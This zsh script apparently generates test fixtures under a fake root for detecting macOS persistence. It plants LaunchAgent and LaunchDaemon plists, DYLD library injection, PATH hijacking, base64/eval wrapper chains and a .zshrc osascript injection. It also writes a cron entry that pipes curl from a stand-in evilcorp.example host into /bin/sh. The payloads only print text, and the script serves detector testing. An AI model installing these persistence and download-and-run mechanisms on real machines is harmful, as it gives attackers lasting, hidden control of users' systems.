#!/bin/zsh
# 测试藏匿手法生成器 —— 全部为本地静态夹具，不产生任何对外网络请求或真实破坏。
# 用法: zsh make_fixtures.zsh <假根目录>
set -e

ROOT="${1:?usage: make_fixtures.zsh <fake-root>}"
BIN="$ROOT/opt/evilcorp/bin"
SCRIPTS="$ROOT/opt/evilcorp/scripts"
LIB="$ROOT/opt/evilcorp/lib"
CONF="$ROOT/opt/evilcorp/conf"
LA_USER="$ROOT$HOME/Library/LaunchAgents"
LA_SYS="$ROOT/Library/LaunchAgents"
LD_SYS="$ROOT/Library/LaunchDaemons"
CRON="$ROOT/etc/periodic"
TABS="$ROOT/var/at/tabs"
SHINIT="$ROOT$HOME"

mkdir -p "$BIN" "$SCRIPTS" "$LIB" "$CONF" "$LA_USER" "$LA_SYS" "$LD_SYS" "$CRON" "$TABS" "$SHINIT"

# 一个"投放的载荷" Mach-O：未签名（我们不做任何签名动作）
cat > /tmp/evil_payload.c <<'EOF'
#include <stdio.h>
int main(void){ printf("payload\n"); return 0; }
EOF
clang -o "$BIN/evil_payload" /tmp/evil_payload.c
rm -f /tmp/evil_payload.c

# 另一个"投放的载荷"：通过 ad-hoc 签名伪装成"已签名程序"
cat > /tmp/adhoc_payload.c <<'EOF'
#include <stdio.h>
int main(void){ printf("adhoc payload\n"); return 0; }
EOF
clang -o "$BIN/adhoc_tool" /tmp/adhoc_payload.c
codesign -s - "$BIN/adhoc_tool"
rm -f /tmp/adhoc_payload.c

# 被注入用的动态库
cat > /tmp/inj.dylib.c <<'EOF'
#include <stdio.h>
__attribute__((constructor)) static void inj(void){ fprintf(stderr, "injected\n"); }
EOF
clang -dynamiclib -o "$LIB/libinject.dylib" /tmp/inj.dylib.c
rm -f /tmp/inj.dylib.c

############################################
# 手法 1: 合法解释器借用 + 多层包装 + base64/eval 混淆
# LaunchAgent -> bash wrapper -> source 二层 wrapper -> eval(base64) -> python3 -c
############################################
B64=$(printf 'import subprocess; print("decoded payload")' | base64)
cat > "$SCRIPTS/stage2.sh" <<EOF
# 二层包装：base64 还原后交给 eval
DECODED=\$(echo "$B64" | base64 -d)
eval "\$DECODED"
EOF

cat > "$SCRIPTS/wrapper.sh" <<EOF
#!/bin/bash
# 一层包装：source 下一层，隐藏真实动作
source "$SCRIPTS/stage2.sh"
exec /usr/bin/logger "wrapper ran"
EOF
chmod +x "$SCRIPTS/wrapper.sh"

cat > "$LA_USER/com.evilcorp.lolbin.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcorp.lolbin</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>$SCRIPTS/wrapper.sh</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

############################################
# 手法 2: DYLD_INSERT_LIBRARIES 环境变量注入
# 合法签名的 /usr/bin/logger 被注入非系统 dylib
############################################
cat > "$LA_USER/com.evilcorp.dyld.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcorp.dyld</string>
  <key>ProgramArguments</key>
  <array><string>/usr/bin/logger</string><string>hello</string></array>
  <key>EnvironmentVariables</key>
  <dict><key>DYLD_INSERT_LIBRARIES</key><string>$LIB/libinject.dylib</string></dict>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

############################################
# 手法 3: 被替换的配置文件（python 读取可写配置，配置指向载荷）
############################################
cat > "$CONF/tasks.conf" <<EOF
# 看似普通配置
task_binary=$BIN/evil_payload
mode=auto
EOF
cat > "$SCRIPTS/config_loader.py" <<EOF
#!/usr/bin/env python3
import configparser, subprocess, os
c = configparser.ConfigParser()
c.read("$CONF/tasks.conf")
# 直接执行配置中声明的二进制
subprocess.run(["$BIN/evil_payload"])
EOF
chmod +x "$SCRIPTS/config_loader.py"

cat > "$LA_SYS/com.evilcfg.agent.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcfg.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/env</string>
    <string>python3</string>
    <string>$SCRIPTS/config_loader.py</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

############################################
# 手法 4: 符号链接伪装 + PATH 劫持
# plist 用裸命令名 "sysupdate"，自定义 PATH 指向假目录里的恶意副本
############################################
ln -sf "$BIN/evil_payload" "$BIN/sysupdate"
cat > "$LA_USER/com.evilcorp.pathhijack.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcorp.pathhijack</string>
  <key>ProgramArguments</key>
  <array><string>env</string><string>PATH=$BIN:/usr/bin:/bin</string><string>sysupdate</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

############################################
# 手法 5: 下载即执行（curl | bash），cron 持久化
############################################
cat > "$CRON/evilcron" <<EOF
# 每天 3:30 拉取远程脚本直接交给 sh 执行
30 3 * * * /usr/bin/curl -s https://updates.evilcorp.example/payload.sh | /bin/sh
@reboot /usr/bin/python3 -c "import urllib.request; urllib.request.urlopen('https://evilcorp.example/x')"
EOF

# 用户 crontab：env 包装 + 内联
cat > "$TABS/victim" <<EOF
*/10 * * * * /usr/bin/env DYLD_FRAMEWORK_PATH=$LIB /bin/echo heartbeat
EOF

############################################
# 手法 6: shell 初始化文件注入（osascript 内联 + 命令替换）
############################################
cat > "$SHINIT/.zshrc" <<EOF
# 用户原有配置
export EDITOR=vi
# 注入行：每次开终端执行，osascript -e 内联 AppleScript
/usr/bin/osascript -e 'do shell script "$BIN/evil_payload"'
ALIASNOW=\$(which ls)
EOF

############################################
# 手法 7: 直接登记未签名 / ad-hoc 二进制的 LaunchDaemon
############################################
cat > "$LD_SYS/com.evilcorp.raw.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcorp.raw</string>
  <key>ProgramArguments</key>
  <array><string>$BIN/evil_payload</string><string>--daemon</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

cat > "$LD_SYS/com.evilcorp.adhoc.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcorp.adhoc</string>
  <key>ProgramArguments</key>
  <array><string>$BIN/adhoc_tool</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

############################################
# 手法 8: 执行链断裂（引用已删除的载荷）
############################################
cat > "$LA_USER/com.evilcorp.missing.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.evilcorp.missing</string>
  <key>ProgramArguments</key>
  <array><string>/bin/bash</string><string>$SCRIPTS/gone.sh</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

############################################
# 对照组：干净的系统项（仅引用系统签名二进制，无可写文件）
############################################
cat > "$LA_SYS/com.benign.agent.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.benign.agent</string>
  <key>ProgramArguments</key>
  <array><string>/usr/bin/logger</string><string>benign heartbeat</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF

# 权限：让"投放目录"里的脚本/库普通用户可写（模拟可替换配置 T03）
chmod -R u+w "$SCRIPTS" "$CONF" "$LIB"

echo "fixtures generated under $ROOT"
find "$ROOT" -type f | sort
